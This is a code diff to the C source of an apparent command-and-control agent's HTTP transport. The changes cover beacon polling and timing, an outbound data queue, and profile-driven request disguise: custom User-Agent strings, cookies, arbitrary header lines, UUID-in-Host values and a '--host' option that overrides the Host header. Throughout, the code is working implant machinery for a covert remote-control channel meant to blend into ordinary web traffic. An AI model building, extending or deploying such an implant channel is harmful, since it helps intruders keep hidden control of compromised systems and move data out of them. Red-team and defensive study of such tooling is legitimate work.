@@ -28,20 +28,25 @@ struct http_ctx {
 	char ** headers;
 	/*
 	 * Number of headers present once http_transport_init finishes — i.e.
-	 * the persistent set (Connection: close, profile custom headers,
-	 * --header args). Anything beyond this index is profile-driven
+	 * the persistent set (Connection: close, top-level custom headers,
+	 * --header args). Anything beyond this index is verb-profile-driven
 	 * per-request state (UUID-in-Host etc.) and gets reset every poll.
 	 */
 	int base_num_headers;
+	char *base_ua;
+	char *base_cookie;
 	struct http_request_data data;
 	struct http_request_opts opts;
 	struct buffer_queue *egress;
 	int first_packet;
 	int running;
 	bool online;
+	unsigned int egress_requests;
 };
 
+static int add_header(struct http_ctx *ctx, const char *header);
 static void reset_profile_headers(struct http_ctx *ctx);
+static void apply_profile_headers(struct http_ctx *ctx, struct c2_verb_config *vc);
 static void http_ctx_free(struct http_ctx *ctx);
 
 /*
@@ -50,14 +55,6 @@ static void http_ctx_free(struct http_ctx *ctx);
  * with the other encode/decode helpers; the buffer is null-terminated.
  */
 static unsigned char *b64url_encode(const void *src, size_t src_len, size_t *out_len)
-
-int http_transport_egress_pending(struct c2_transport *t)
-{
-	struct http_ctx *ctx = c2_transport_get_ctx(t);
-	return buffer_queue_len(ctx->egress) > 0;
-}
-
-static void patch_uri(struct http_ctx *ctx, struct buffer_queue *q)
 {
 	unsigned char *b64 = malloc(B64_ENCODED_LEN(src_len));
 	if (!b64) return NULL;
@@ -72,6 +69,12 @@ static void patch_uri(struct http_ctx *ctx, struct buffer_queue *q)
 	b64[len] = '\0';
 	if (out_len) *out_len = len;
 	return b64;
+}
+
+static int http_transport_egress_pending(struct c2_transport *t)
+{
+	struct http_ctx *ctx = c2_transport_get_ctx(t);
+	return ctx && (buffer_queue_len(ctx->egress) > 0 || ctx->egress_requests > 0);
 }
 
 static unsigned char *c2_encode(const void *data, size_t len, int enc, size_t *out_len)
@@ -423,13 +426,12 @@ static void http_poll_cb(struct http_conn *conn, void *arg)
 
 	int code = http_conn_response_code(conn);
 
-	if (code > 0) {
+	if (code == 200) {
 		if(!ctx->online) {
 			ctx->first_packet = 1;
 			ctx->poll_timer.repeat = 0.1;
 			ctx->online = true;
 		}
-		c2_transport_reachable(ctx->t);
 	} else {
 		c2_transport_unreachable(ctx->t);
 		ctx->online = false;
@@ -454,6 +456,9 @@ static void http_poll_cb(struct http_conn *conn, void *arg)
 			}
 		}
 	}
+	if (code == 200) {
+		c2_transport_reachable(ctx->t);
+	}
 	if(ctx->online) {
 		if (got_command) {
 			ctx->poll_timer.repeat = 0.1;
@@ -473,6 +478,15 @@ static void http_poll_cb(struct http_conn *conn, void *arg)
 	}
 }
 
+static void http_post_cb(struct http_conn *conn, void *arg)
+{
+	struct http_ctx *ctx = arg;
+	if (ctx->egress_requests > 0) {
+		ctx->egress_requests--;
+	}
+	http_poll_cb(conn, arg);
+}
+
 static void add_profile_headers(struct http_ctx *ctx, struct c2_verb_config *vc)
 {
 	/*
@@ -481,7 +495,7 @@ static void add_profile_headers(struct http_ctx *ctx, struct c2_verb_config *vc)
 	 * even when vc is NULL, so switching profiles or losing one doesn't
 	 * leak the prior values either.
 	 */
-	reset_profile_headers(ctx);
+	apply_profile_headers(ctx, vc);
 
 	if (!vc) return;
 
@@ -514,6 +528,10 @@ static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int rev
 	struct http_ctx *ctx = w->data;
 	bool sent = false;
 
+	/* HTTP requests are asynchronous. Stop this repeating timer until the
+	 * current request completes so a slow link cannot open overlapping polls. */
+	ev_timer_stop(loop, w);
+
 	struct c2_transport_config *tc = c2_transport_get_config(ctx->t);
 	struct c2_verb_config *post_profile = tc ? tc->c2_post : NULL;
 	struct c2_verb_config *get_profile = tc ? tc->c2_get : NULL;
@@ -535,9 +553,12 @@ static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int rev
 		free(uuid);
 		add_profile_headers(ctx, post_profile);
 
-		http_request(post_url ? post_url : ctx->uri, http_request_post,
-				http_poll_cb, ctx, &ctx->data, &ctx->opts);
+		if (http_request(post_url ? post_url : ctx->uri, http_request_post,
+				http_post_cb, ctx, &ctx->data, &ctx->opts) == 0) {
+			ctx->egress_requests++;
+		}
 		free(post_url);
+		free(ctx->data.content);
 		ctx->data.content_len = 0;
 		ctx->data.content = NULL;
 		sent = true;
@@ -567,8 +588,10 @@ static void http_ctx_free(struct http_ctx *ctx)
 		}
 		free(ctx->headers);
 		free(ctx->data.ua);
+		free(ctx->base_ua);
 		free(ctx->data.referer);
 		free(ctx->data.cookie_list);
+		free(ctx->base_cookie);
 		free((void *)ctx->opts.proxy.hostname);
 		free((void *)ctx->opts.proxy.auth_user);
 		free((void *)ctx->opts.proxy.auth_pass);
@@ -605,6 +628,32 @@ static void reset_profile_headers(struct http_ctx *ctx)
 		free(ctx->headers[i]);
 	}
 	ctx->data.num_headers = ctx->base_num_headers;
+}
+
+static void apply_profile_headers(struct http_ctx *ctx, struct c2_verb_config *vc)
+{
+	const char *user_agent = vc && vc->user_agent ? vc->user_agent : ctx->base_ua;
+
+	reset_profile_headers(ctx);
+	free(ctx->data.ua);
+	ctx->data.ua = user_agent ? strdup(user_agent) : NULL;
+	free(ctx->data.cookie_list);
+	ctx->data.cookie_list = ctx->base_cookie ? strdup(ctx->base_cookie) : NULL;
+
+	if (vc && vc->custom_headers) {
+		char *headers = strdup(vc->custom_headers);
+		if (!headers) {
+			return;
+		}
+		char *line = strtok(headers, "\r\n");
+		while (line) {
+			if (*line) {
+				add_header(ctx, line);
+			}
+			line = strtok(NULL, "\r\n");
+		}
+		free(headers);
+	}
 }
 
 /*
@@ -700,16 +749,20 @@ int http_transport_init(struct c2_transport *t)
 	}
 
 	/* Legacy: parse args after | in URI */
-	const char *ua = c2_transport_ua(t);
-	if (ua) {
-		ctx->data.ua = strdup(ua);
-		log_info("ua: %s", ctx->data.ua);
-	}
-
-	const char *raw_args = c2_transport_args(t);
-	if (raw_args && strlen(raw_args)) {
-		char *args = strdup(raw_args);
-		if (args) {
+	char *args = strchr(ctx->uri, '|');
+	if (args) {
+		*args = '\0';
+		if (strlen(++args)) {
+			size_t argc = 0;
+			char **argv = argv_split(args, NULL, &argc);
+			for (size_t i = 0; i + 1 < argc && argv[i + 1]; i += 2) {
+				if (strcmp(argv[i], "--host") == 0) {
+					char *host_header = NULL;
+					if (asprintf(&host_header, "Host: %s", argv[i + 1]) != -1) {
+						add_header(ctx, host_header);
+						free(host_header);
+					}
+				}
 				if (strcmp(argv[i], "--ua") == 0) {
 					free(ctx->data.ua);
 					ctx->data.ua = strdup(argv[i + 1]);
@@ -729,6 +782,8 @@ int http_transport_init(struct c2_transport *t)
 
 	ctx->data.headers = ctx->headers;
 	ctx->base_num_headers = ctx->data.num_headers;
+	ctx->base_ua = ctx->data.ua ? strdup(ctx->data.ua) : NULL;
+	ctx->base_cookie = ctx->data.cookie_list ? strdup(ctx->data.cookie_list) : NULL;
 	ctx->first_packet = 1;
 	ctx->online = false;
 	ev_init(&ctx->poll_timer, http_poll_timer_cb);
@@ -767,6 +822,7 @@ void http_transport_stop(struct c2_transport *t)
 	struct http_ctx *ctx = c2_transport_get_ctx(t);
 	if (ctx->running) {
 		ctx->running = 0;
+		ev_timer_stop(c2_transport_loop(t), &ctx->poll_timer);
 	}
 }
 
@@ -782,6 +838,7 @@ void c2_register_http_transports(struct c2 *c2)
 		.init = http_transport_init,
 		.start = http_transport_start,
 		.egress = http_transport_egress,
+		.egress_pending = http_transport_egress_pending,
 		.stop = http_transport_stop,
 		.free = http_transport_free
 	};
